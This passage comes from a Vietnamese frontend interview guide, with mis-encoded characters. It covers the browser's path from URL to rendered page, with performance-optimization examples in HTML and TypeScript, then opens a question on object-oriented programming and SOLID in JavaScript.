    - **ChÃº thÃ­ch**: Sáº¯p xáº¿p mÃ³n Äƒn lÃªn Ä‘Ä©a theo cÃ¡ch Ä‘áº¹p máº¯t

11. **Layout (Reflow)** - ~50-500ms

    ```
    TÃ­nh toÃ¡n:
    - Vá»‹ trÃ­ (x, y) cá»§a má»—i element
    - KÃ­ch thÆ°á»›c (width, height)
    - Box model (margin, padding, border)
    ```

    - Browser tÃ­nh toÃ¡n **geometry** (hÃ¬nh há»c) cá»§a má»—i element
    - **âš ï¸ Expensive**: Thay Ä‘á»•i layout triggers reflow toÃ n bá»™ tree
    - **ChÃº thÃ­ch**: Äo kÃ­ch thÆ°á»›c vÃ  vá»‹ trÃ­ tá»«ng thÃ nh pháº§n trÃªn Ä‘Ä©a

12. **Paint & Composite** - ~50-200ms
    - **Paint**: Chuyá»ƒn elements thÃ nh pixels (fill colors, draw text, images...)
    - **Composite**: Káº¿t há»£p cÃ¡c layers thÃ nh final image
    - GPU acceleration cho `transform`, `opacity`
    - **ChÃº thÃ­ch**: Váº½ mÃ³n Äƒn lÃªn giáº¥y vÃ  ghÃ©p cÃ¡c lá»›p láº¡i thÃ nh hÃ¬nh hoÃ n chá»‰nh

**ğŸ¯ Total Time: ~800ms - 5000ms** (phá»¥ thuá»™c network, server, complexity)

**Hoáº¡t Ä‘á»™ng:**

**ğŸ“Š Timeline minh há»a:**

```
Time â†’  0ms          200ms        400ms        600ms        800ms       1000ms
        â”‚             â”‚            â”‚            â”‚            â”‚            â”‚
DNS     â–ˆâ–ˆâ–ˆâ–ˆ
TCP         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
TLS              â–ˆâ–ˆâ–ˆâ–ˆ
Request               â–ˆâ–ˆ
Server                  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
Response                            â–ˆâ–ˆâ–ˆâ–ˆ
HTML Parse                              â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
CSS Parse                                   â–ˆâ–ˆâ–ˆâ–ˆ
JS Exec                                         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
Layout                                                 â–ˆâ–ˆâ–ˆ
Paint                                                     â–ˆâ–ˆ
        â”‚             â”‚            â”‚            â”‚            â”‚            â”‚
        â””â”€ NETWORK â”€â”€â”´â”€â”€ PARSING â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RENDERING â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ğŸ”¥ Critical Rendering Path (Con Ä‘Æ°á»ng render quan trá»ng):**

```
HTML â†’ DOM Tree â”€â”
                  â”œâ”€â†’ Render Tree â†’ Layout â†’ Paint â†’ Composite â†’ Display
CSS â†’ CSSOM Tree â”€â”˜
        â†‘
        â”‚
    JS cÃ³ thá»ƒ modify DOM/CSSOM (triggering reflow/repaint)
```

---

**Æ¯u Ä‘iá»ƒm:**

1. **Efficient Pipeline**: Browser optimize má»—i bÆ°á»›c Ä‘á»ƒ render nhanh nháº¥t
2. **Progressive Rendering**: Browser render tá»«ng pháº§n khi cÃ³ data (khÃ´ng Ä‘á»£i full page load)
3. **Caching**: DNS, TCP connections, assets Ä‘Æ°á»£c cache Ä‘á»ƒ láº§n sau nhanh hÆ¡n
4. **Parallel Processing**: Browser download multiple resources Ä‘á»“ng thá»i (HTTP/2, HTTP/3)
5. **GPU Acceleration**: DÃ¹ng GPU cho animations (`transform`, `opacity`) thay vÃ¬ CPU

---

**NhÆ°á»£c Ä‘iá»ƒm:**

1. **Render-blocking CSS**: Pháº£i load háº¿t CSS má»›i render â†’ tÄƒng FCP (First Contentful Paint)
2. **Parser-blocking JS**: `<script>` cháº·n HTML parsing â†’ delay DOM construction
3. **Network Latency**: Má»—i RTT (Round-Trip Time) thÃªm ~100-300ms delay
4. **Reflow/Repaint Expensive**: Thay Ä‘á»•i layout trigger reflow toÃ n bá»™ page
5. **Third-party Scripts**: Ads, analytics lÃ m cháº­m page load

---

**ChÃº thÃ­ch:**

**ğŸ¯ CÃ¡c metrics quan trá»ng (Web Vitals):**

- **FCP (First Contentful Paint)**: Thá»i gian browser render first content (~1-2s)
- **LCP (Largest Contentful Paint)**: Thá»i gian render largest content (~2-3s)
- **TTI (Time to Interactive)**: Thá»i gian page cÃ³ thá»ƒ tÆ°Æ¡ng tÃ¡c (~3-5s)
- **CLS (Cumulative Layout Shift)**: Äo lÆ°á»ng layout shift (< 0.1 lÃ  tá»‘t)
- **FID (First Input Delay)**: Delay tá»« khi user click Ä‘áº¿n khi browser respond (< 100ms)

**âš¡ Optimization techniques:**

1. **DNS Prefetch**: `<link rel="dns-prefetch" href="//api.example.com">`
2. **Preconnect**: `<link rel="preconnect" href="//cdn.example.com">`
3. **Resource Hints**: `<link rel="preload" as="script" href="critical.js">`
4. **Critical CSS**: Inline critical CSS, defer non-critical
5. **Async/Defer JS**: `<script async src="analytics.js">`
6. **Code Splitting**: Load only needed code first
7. **Image Optimization**: WebP, lazy loading, responsive images
8. **CDN**: Serve static assets from edge locations closer to users
9. **HTTP/2 or HTTP/3**: Multiplexing, server push
10. **Service Worker**: Cache assets for offline/fast subsequent loads

---

**Code Example:**

**ğŸ” VÃ­ dá»¥ 1: Waterfall Network Requests (Sequential loading - SLOW)**

```html
<!DOCTYPE html>
<html>
  <head>
    <!-- âŒ BAD: Blocking CSS -->
    <link rel="stylesheet" href="styles.css" />
    <!-- Wait 200ms -->

    <!-- âŒ BAD: Parser-blocking script -->
    <script src="jquery.js"></script>
    <!-- Wait 300ms, blocks HTML parsing -->
    <script src="app.js"></script>
    <!-- Wait 200ms, blocks HTML parsing -->
  </head>
  <body>
    <h1>Hello World</h1>

    <!-- âŒ BAD: Synchronous image loading -->
    <img src="hero.jpg" width="1200" height="600" />
    <!-- Wait 500ms -->
  </body>
</html>

<!--
Total blocking time: 200 + 300 + 200 = 700ms
FCP: ~900ms (after styles.css + scripts loaded)
âŒ User sees blank white screen for ~900ms
-->
```

**âœ… VÃ­ dá»¥ 2: Optimized Loading (Parallel + Progressive - FAST)**

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- âœ… GOOD: DNS prefetch for external domains -->
    <link rel="dns-prefetch" href="//api.example.com" />
    <link rel="preconnect" href="//cdn.example.com" crossorigin />

    <!-- âœ… GOOD: Inline critical CSS (above-the-fold styles) -->
    <style>
      /* Critical CSS: chá»‰ styles cho ná»™i dung Ä‘áº§u trang */
      body {
        margin: 0;
        font-family: sans-serif;
      }
      .hero {
        height: 100vh;
        background: #f0f0f0;
      }
      h1 {
        font-size: 3rem;
      }
    </style>

    <!-- âœ… GOOD: Preload critical resources -->
    <link rel="preload" as="font" href="/fonts/main.woff2" crossorigin />
    <link rel="preload" as="image" href="/hero.webp" />

    <!-- âœ… GOOD: Defer non-critical CSS -->
    <link
      rel="preload"
      as="style"
      href="styles.css"
      onload="this.onload=null;this.rel='stylesheet'"
    />
    <noscript><link rel="stylesheet" href="styles.css" /></noscript>
  </head>
  <body>
    <div class="hero">
      <h1>Hello World</h1>

      <!-- âœ… GOOD: Responsive images with lazy loading -->
      <img
        src="hero-small.webp"
        srcset="
          hero-small.webp   400w,
          hero-medium.webp  800w,
          hero-large.webp  1200w
        "
        sizes="100vw"
        loading="lazy"
        decoding="async"
        alt="Hero image"
      />
    </div>

    <!-- âœ… GOOD: Defer non-critical scripts -->
    <script src="jquery.js" defer></script>
    <script src="app.js" defer></script>

    <!-- âœ… GOOD: Async third-party scripts -->
    <script async src="https://analytics.com/script.js"></script>
  </body>
</html>

<!--
Critical CSS inline: 0ms blocking
Images lazy load: khÃ´ng block render
Scripts defer: download parallel, execute after DOM ready
âœ… FCP: ~200-400ms (user sees content immediately!)
-->
```

**ğŸ” VÃ­ dá»¥ 3: Measuring Performance vá»›i Performance API**

```typescript
// Äo cÃ¡c Web Vitals metrics
interface PerformanceMetrics {
  dns: number;
  tcp: number;
  request: number;
  response: number;
  domParse: number;
  domReady: number;
  load: number;
  fcp: number;
  lcp: number;
}

function measurePerformance(): PerformanceMetrics {
  const perfData = performance.timing;
  const navigation = performance.getEntriesByType(
    'navigation'
  )[0] as PerformanceNavigationTiming;

  return {
    // Network metrics
    dns: perfData.domainLookupEnd - perfData.domainLookupStart,
    tcp: perfData.connectEnd - perfData.connectStart,
    request: perfData.responseStart - perfData.requestStart,
    response: perfData.responseEnd - perfData.responseStart,

    // Parsing metrics
    domParse: perfData.domInteractive - perfData.domLoading,
    domReady: perfData.domContentLoadedEventEnd - perfData.navigationStart,
    load: perfData.loadEventEnd - perfData.navigationStart,

    // Web Vitals (approximate)
    fcp: navigation.responseStart - navigation.fetchStart,
    lcp: 0, // Cáº§n dÃ¹ng PerformanceObserver
  };
}

// Observe LCP (Largest Contentful Paint)
const observer = new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lastEntry = entries[entries.length - 1] as PerformanceEntry & {
    renderTime: number;
  };

  console.log('LCP:', lastEntry.renderTime || lastEntry.startTime);
});

observer.observe({ entryTypes: ['largest-contentful-paint'] });

// Log metrics after page load
window.addEventListener('load', () => {
  setTimeout(() => {
    const metrics = measurePerformance();
    console.table(metrics);

    /* Example output:
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  Metric   â”‚ Time   â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚ dns       â”‚ 45ms   â”‚
    â”‚ tcp       â”‚ 123ms  â”‚
    â”‚ request   â”‚ 87ms   â”‚
    â”‚ response  â”‚ 234ms  â”‚
    â”‚ domParse  â”‚ 456ms  â”‚
    â”‚ domReady  â”‚ 789ms  â”‚
    â”‚ load      â”‚ 1234ms â”‚
    â”‚ fcp       â”‚ 567ms  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    */
  }, 0);
});
```

**ğŸ” VÃ­ dá»¥ 4: Tá»‘i Æ¯u Critical Rendering Path trong Trading App**

```typescript
// âŒ BAD: Load táº¥t cáº£ chart libraries upfront
import { Chart } from 'chart.js'; // 200KB
import { TradingView } from 'tradingview'; // 500KB
import { DataGrid } from 'ag-grid'; // 300KB

class TradingApp {
  async init() {
    // Load all libs â†’ 1000KB â†’ 3-5s load time!
    this.chart = new Chart();
    this.tradingView = new TradingView();
    this.grid = new DataGrid();
  }
}

// âœ… GOOD: Code splitting + Lazy loading
class TradingAppOptimized {
  private chart?: any;
  private tradingView?: any;
  private grid?: any;

  async init() {
    // Load critical UI first (header, sidebar)
    this.renderCriticalUI();

    // Lazy load chart when needed
    this.loadChartLazy();
  }

  renderCriticalUI() {
    // Inline critical CSS
    document.head.insertAdjacentHTML(
      'beforeend',
      `
      <style>
        .header { /* critical styles */ }
        .sidebar { /* critical styles */ }
      </style>
    `
    );

    // Render skeleton UI immediately
    document.body.innerHTML = `
      <div class="header">Trading Platform</div>
      <div class="sidebar">Menu...</div>
      <div id="chart-container">
        <div class="skeleton-loader"></div>
      </div>
    `;
  }

  async loadChartLazy() {
    // Dynamic import: chá»‰ load khi cáº§n
    const { Chart } = await import(
      /* webpackChunkName: "chart" */
      /* webpackPrefetch: true */
      'chart.js'
    );

    this.chart = new Chart();
    this.renderChart();
  }

  // Lazy load trading view chá»‰ khi user click tab
  async loadTradingView() {
    if (!this.tradingView) {
      const { TradingView } = await import('tradingview');
      this.tradingView = new TradingView();
    }
    return this.tradingView;
  }
}

// Resource hints Ä‘á»ƒ pre-load chunks
document.head.insertAdjacentHTML(
  'beforeend',
  `
  <link rel="prefetch" href="/chunks/chart.js">
  <link rel="preload" as="script" href="/critical.js">
`
);

/*
ğŸ“Š Káº¿t quáº£:
âŒ BAD:
  - Bundle size: 1000KB
  - FCP: 3-5s
  - TTI: 5-7s

âœ… GOOD:
  - Initial bundle: 100KB
  - FCP: 500ms-1s
  - TTI: 1-2s
  - Load chart.js khi cáº§n: +200ms
*/
```

---

**Best Practices:**

```typescript
// âœ… DO: Optimize Critical Rendering Path

// 1. Minimize Critical Resources
// - Inline critical CSS (above-the-fold)
// - Defer non-critical CSS
// - Async/defer non-critical JS

// 2. Reduce Number of Critical Bytes
// - Minify HTML/CSS/JS
// - Compress with Gzip/Brotli
// - Remove unused code (tree-shaking)

// 3. Optimize Critical Path Length
// - Reduce redirects
// - Use CDN
// - HTTP/2 multiplexing
// - Preconnect to required origins

// 4. Resource Hints
<link rel="dns-prefetch" href="//api.example.com">
<link rel="preconnect" href="//cdn.example.com">
<link rel="prefetch" href="/next-page.js">
<link rel="preload" as="script" href="/critical.js">

// 5. Code Splitting
const ChartComponent = lazy(() => import('./Chart'));

// 6. Image Optimization
<img
  src="image.webp"
  loading="lazy"
  decoding="async"
  srcset="small.webp 400w, large.webp 1200w"
>

// 7. Service Worker for Caching
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

// 8. Measure & Monitor
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('LCP:', entry.renderTime || entry.startTime);

    // Send to analytics
    sendToAnalytics({
      metric: 'lcp',
      value: entry.renderTime || entry.startTime,
      url: window.location.href
    });
  }
});

observer.observe({ entryTypes: ['largest-contentful-paint'] });
```

---

**Common Mistakes:**

```typescript
// âŒ MISTAKE 1: Render-blocking CSS
<link rel="stylesheet" href="styles.css">
// Browser pháº£i download + parse CSS trÆ°á»›c khi render báº¥t cá»© gÃ¬!

// âœ… FIX: Inline critical CSS, defer rest
<style>/* inline critical CSS */</style>
<link rel="preload" as="style" href="styles.css"
      onload="this.rel='stylesheet'">

// âŒ MISTAKE 2: Parser-blocking scripts
<script src="app.js"></script>
// Cháº·n HTML parsing!

// âœ… FIX: Defer scripts
<script src="app.js" defer></script>

// âŒ MISTAKE 3: KhÃ´ng optimize images
<img src="huge-image.jpg"> <!-- 5MB image! -->

// âœ… FIX: Responsive images + lazy loading
<img
  src="small.webp"
  srcset="small.webp 400w, large.webp 1200w"
  sizes="(max-width: 600px) 400px, 1200px"
  loading="lazy"
  decoding="async"
>

// âŒ MISTAKE 4: QuÃ¡ nhiá»u synchronous requests
fetch('/api/user');
fetch('/api/orders');
fetch('/api/positions');
// Sequential â†’ ~3s total

// âœ… FIX: Parallel requests
Promise.all([
  fetch('/api/user'),
  fetch('/api/orders'),
  fetch('/api/positions')
]);
// Parallel â†’ ~1s total

// âŒ MISTAKE 5: Layout thrashing
for (let i = 0; i < 100; i++) {
  const height = element.offsetHeight; // Read (trigger layout)
  element.style.height = height + 10 + 'px'; // Write (trigger reflow)
}
// 100 reflows! Ráº¥t cháº­m!

// âœ… FIX: Batch reads/writes
const heights = [];
for (let i = 0; i < 100; i++) {
  heights.push(element.offsetHeight); // Read all
}
for (let i = 0; i < 100; i++) {
  element.style.height = heights[i] + 10 + 'px'; // Write all
}
// Chá»‰ 1 reflow!

// âŒ MISTAKE 6: KhÃ´ng measure performance
// LÃ m sao biáº¿t optimize cÃ³ hiá»‡u quáº£?

// âœ… FIX: Monitor Web Vitals
import { getCLS, getFID, getFCP, getLCP, getTTFB } from 'web-vitals';

getCLS(console.log);
getFID(console.log);
getFCP(console.log);
getLCP(console.log);
getTTFB(console.log);
```

---

**ğŸ“‹ TÃ³m táº¯t 12 BÆ°á»›c tá»« URL â†’ UI:**

```
1. DNS Lookup       â†’ Resolve domain â†’ IP
2. TCP Handshake    â†’ Establish connection (SYN, SYN-ACK, ACK)
3. TLS Handshake    â†’ Secure connection (HTTPS)
4. HTTP Request     â†’ Browser â†’ Server
5. Server Process   â†’ Generate response
6. HTTP Response    â†’ Server â†’ Browser (HTML)
7. HTML Parse       â†’ DOM Tree
8. CSS Parse        â†’ CSSOM Tree
9. JS Execution     â†’ Modify DOM/CSSOM (náº¿u cÃ³)
10. Render Tree     â†’ DOM + CSSOM = Render Tree
11. Layout          â†’ TÃ­nh toÃ¡n vá»‹ trÃ­ & kÃ­ch thÆ°á»›c
12. Paint+Composite â†’ Váº½ pixels lÃªn mÃ n hÃ¬nh â†’ âœ… USER SEES UI!
```

**ğŸ¯ Critical Rendering Path:** `HTML â†’ DOM + CSS â†’ CSSOM = Render Tree â†’ Layout â†’ Paint`

**âš¡ Tá»‘i Æ°u:** Minimize critical resources, reduce bytes, optimize path length!

---
</details>


<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ›ï¸ Q49: OOP (Object-Oriented Programming) trong JavaScript - Classes, Inheritance, Encapsulation & SOLID Principles?</span></summary>


**Tráº£ lá»i:**
OOP (Láº­p trÃ¬nh HÆ°á»›ng Äá»‘i TÆ°á»£ng) lÃ  **paradigm láº­p trÃ¬nh** dá»±a trÃªn **objects** (Ä‘á»‘i tÆ°á»£ng) chá»©a:

- **Data** (dá»¯ liá»‡u) â†’ properties/fields (thuá»™c tÃ­nh)
- **Behavior** (hÃ nh vi) â†’ methods (phÆ°Æ¡ng thá»©c)

JavaScript há»— trá»£ OOP thÃ´ng qua 5 concepts chÃ­nh:

1. **Classes (Lá»›p)** - ES6+

   - LÃ  "báº£n thiáº¿t káº¿" (blueprint) Ä‘á»ƒ táº¡o objects
   - Syntactic sugar cho prototype-based inheritance
   - **VÃ­ dá»¥**: `class User { ... }` â†’ táº¡o ra nhiá»u user objects

2. **Encapsulation (ÄÃ³ng gÃ³i)**

   - áº¨n implementation details (chi tiáº¿t triá»ƒn khai) bÃªn trong class
   - Chá»‰ expose ra public API cáº§n thiáº¿t
   - DÃ¹ng **private fields** (`#fieldName`) Ä‘á»ƒ báº£o vá»‡ data
   - **VÃ­ dá»¥**: `#balance` trong BankAccount khÃ´ng thá»ƒ truy cáº­p tá»« bÃªn ngoÃ i

3. **Inheritance (Káº¿ thá»«a)**

   - Class con (child) káº¿ thá»«a properties/methods tá»« class cha (parent)
   - TÃ¡i sá»­ dá»¥ng code, trÃ¡nh duplication
   - DÃ¹ng keyword `extends`
   - **VÃ­ dá»¥**: `Admin extends User` â†’ Admin cÃ³ táº¥t cáº£ methods cá»§a User + thÃªm methods riÃªng

4. **Polymorphism (Äa hÃ¬nh)**

   - Subclass cÃ³ thá»ƒ override (ghi Ä‘Ã¨) methods cá»§a parent
   - CÃ¹ng method name nhÆ°ng behavior khÃ¡c nhau
   - **VÃ­ dá»¥**: `Admin.login()` khÃ¡c `User.login()` (Admin cÃ³ thÃªm audit log)

5. **Composition (Káº¿t há»£p)**
   - "Has-a" relationship thay vÃ¬ "Is-a" (inheritance)
   - Inject dependencies vÃ o class thay vÃ¬ káº¿ thá»«a
   - **Æ¯u tiÃªn hÆ¡n Inheritance** (Composition > Inheritance)
   - **VÃ­ dá»¥**: `UserService` cÃ³ `logger` vÃ  `emailService` (inject vÃ o) thay vÃ¬ káº¿ thá»«a tá»« Logger

**ğŸ¯ SOLID Principles (5 nguyÃªn táº¯c thiáº¿t káº¿ OOP):**

- **S**ingle Responsibility: 1 class chá»‰ lÃ m 1 viá»‡c
- **O**pen/Closed: Má»Ÿ cho má»Ÿ rá»™ng, Ä‘Ã³ng cho sá»­a Ä‘á»•i
- **L**iskov Substitution: Subclass thay tháº¿ Ä‘Æ°á»£c parent
- **I**nterface Segregation: Interfaces nhá», táº­p trung
- **D**ependency Inversion: Phá»¥ thuá»™c vÃ o abstractions, khÃ´ng pháº£i concretions

**Hoáº¡t Ä‘á»™ng:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              OOP Concepts Flow                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                          â”‚
â”‚  1. CLASS DEFINITION (Blueprint)                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚ class User {                        â”‚                â”‚
â”‚  â”‚   #password // Private field       â”‚                â”‚
â”‚  â”‚   constructor(name) { ... }        â”‚                â”‚
â”‚  â”‚   login() { ... }                  â”‚                â”‚
â”‚  â”‚ }                                   â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚               â†“                                          â”‚
â”‚  2. INSTANTIATION (Create object)                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚ const user = new User('John')       â”‚                â”‚
â”‚  â”‚ user.login() // Call method        â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚               â†“                                          â”‚
â”‚  3. INHERITANCE (Reuse code)                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚ class Admin extends User {          â”‚                â”‚
â”‚  â”‚   deleteUser() { ... }              â”‚                â”‚
â”‚  â”‚ }                                   â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚               â†“                                          â”‚
â”‚  4. POLYMORPHISM (Override behavior)                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚ class Admin extends User {          â”‚                â”‚
â”‚  â”‚   login() { // Override             â”‚                â”‚
â”‚  â”‚     super.login()                   â”‚                â”‚
â”‚  â”‚     this.logAudit()                 â”‚                â”‚
â”‚  â”‚   }                                  â”‚                â”‚
â”‚  â”‚ }                                   â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚               â†“                                          â”‚
â”‚  5. COMPOSITION (Combine objects)                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚ class User {                        â”‚                â”‚
â”‚  â”‚   constructor(logger) {             â”‚                â”‚
â”‚  â”‚     this.logger = logger // Inject â”‚                â”‚
â”‚  â”‚   }                                  â”‚                â”‚
â”‚  â”‚ }                                   â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Æ¯u Ä‘iá»ƒm:**

1. **âœ… Code Reusability (TÃ¡i sá»­ dá»¥ng Code)**

   - **Giáº£i thÃ­ch**: Inheritance cho phÃ©p class con káº¿ thá»«a táº¥t cáº£ properties/methods tá»« class cha
   - **Lá»£i Ã­ch**: KhÃ´ng pháº£i viáº¿t láº¡i code â†’ giáº£m duplication, dá»… maintain
   - **VÃ­ dá»¥**:
     - `Admin extends User` â†’ Admin cÃ³ sáºµn `login()`, `logout()` tá»« User
     - Chá»‰ cáº§n viáº¿t thÃªm methods riÃªng nhÆ° `deleteUser()`, `manageRoles()`
   - **Thá»±c táº¿**:
     - Base class `Animal` cÃ³ `eat()`, `sleep()`
     - `Dog`, `Cat`, `Bird` Ä‘á»u káº¿ thá»«a â†’ khÃ´ng viáº¿t láº¡i 3 láº§n

2. **âœ… Maintainability (Dá»… Báº£o trÃ¬)**

   - **Giáº£i thÃ­ch**: Encapsulation (Ä‘Ã³ng gÃ³i) áº©n implementation details, chá»‰ expose public API
   - **Lá»£i Ã­ch**:
     - Thay Ä‘á»•i internal logic khÃ´ng áº£nh hÆ°á»Ÿng code bÃªn ngoÃ i
     - TÃ¡ch biá»‡t concerns (data vs behavior)
     - Dá»… refactor
   - **VÃ­ dá»¥**:
     - `#balance` trong BankAccount lÃ  private â†’ thay Ä‘á»•i cÃ¡ch tÃ­nh balance khÃ´ng áº£nh hÆ°á»Ÿng caller
     - External code chá»‰ gá»i `getBalance()` (stable API)
   - **Thá»±c táº¿**:
     - Sá»­a validation logic trong `UserValidator` â†’ khÃ´ng áº£nh hÆ°á»Ÿng `UserService`
     - Thay database trong `UserRepository` â†’ khÃ´ng áº£nh hÆ°á»Ÿng business logic

3. **âœ… Scalability (Kháº£ nÄƒng Má»Ÿ rá»™ng)**

   - **Giáº£i thÃ­ch**: Dá»… dÃ ng thÃªm tÃ­nh nÄƒng má»›i qua subclasses hoáº·c composition
   - **Lá»£i Ã­ch**:
     - Extend functionality mÃ  khÃ´ng sá»­a code cÅ© (Open/Closed Principle)
     - ThÃªm classes má»›i Ä‘á»™c láº­p
   - **VÃ­ dá»¥**:
     - CÃ³ `PaymentMethod` abstract â†’ thÃªm `MomoPayment`, `ZaloPayPayment` dá»… dÃ ng
     - KhÃ´ng cáº§n sá»­a code xá»­ lÃ½ payment hiá»‡n táº¡i
   - **Thá»±c táº¿**:
     - E-commerce cÃ³ `StandardShipping` â†’ thÃªm `ExpressShipping`, `SameDayShipping`
     - Trading system cÃ³ `MarketOrder` â†’ thÃªm `LimitOrder`, `StopLossOrder`

4. **âœ… Type Safety (An toÃ n Kiá»ƒu)**

   - **Giáº£i thÃ­ch**: TypeScript interfaces/abstract classes enforce contracts, catch errors at compile-time
   - **Lá»£i Ã­ch**:
     - IDE autocomplete Ä‘áº§y Ä‘á»§
     - Catch errors trÆ°á»›c khi run code
     - Documentation tá»± Ä‘á»™ng qua types
   - **VÃ­ dá»¥**:

     ```typescript
     interface ILogger {
       log(message: string): void; // Contract
     }

     class Service {
       constructor(private logger: ILogger) {} // Type-safe
     }

     new Service(123); // âŒ Error: 123 khÃ´ng pháº£i ILogger
     ```

   - **Thá»±c táº¿**:
     - `UserService` require `ILogger` â†’ khÃ´ng thá»ƒ pass `string` hay `number`
     - Refactor method signature â†’ TypeScript bÃ¡o lá»—i táº¥t cáº£ nÆ¡i gá»i

5. **âœ… Testability (Dá»… Kiá»ƒm thá»­)**

   - **Giáº£i thÃ­ch**: Dependency Injection vá»›i composition cho phÃ©p inject mocks khi test
   - **Lá»£i Ã­ch**:
     - Test isolated (khÃ´ng phá»¥ thuá»™c external services)
     - Fast (khÃ´ng call API/database tháº­t)
     - Predictable (mock return cá»‘ Ä‘á»‹nh)
   - **VÃ­ dá»¥**:

     ```typescript
     // Production
     const service = new UserService(new RealLogger(), new RealEmailService());

     // Testing
     const service = new UserService(new MockLogger(), new MockEmailService());
     ```

   - **Thá»±c táº¿**:
     - Test `TradingService` vá»›i mock `OrderExecutor` â†’ khÃ´ng gá»­i lá»‡nh tháº­t lÃªn sÃ n
     - Test `PaymentService` vá»›i mock `PaymentGateway` â†’ khÃ´ng charge tiá»n tháº­t

**NhÆ°á»£c Ä‘iá»ƒm:**

1. **âŒ Over-Engineering (Thiáº¿t káº¿ QuÃ¡ phá»©c táº¡p)**

   - **Giáº£i thÃ­ch**: Inheritance hierarchy quÃ¡ sÃ¢u (nhiá»u táº§ng káº¿ thá»«a) â†’ khÃ³ hiá»ƒu, khÃ³ maintain
   - **Váº¥n Ä‘á»**:
     - Pháº£i Ä‘á»c nhiá»u classes Ä‘á»ƒ hiá»ƒu logic
     - KhÃ³ trace method Ä‘Æ°á»£c gá»i tá»« Ä‘Ã¢u
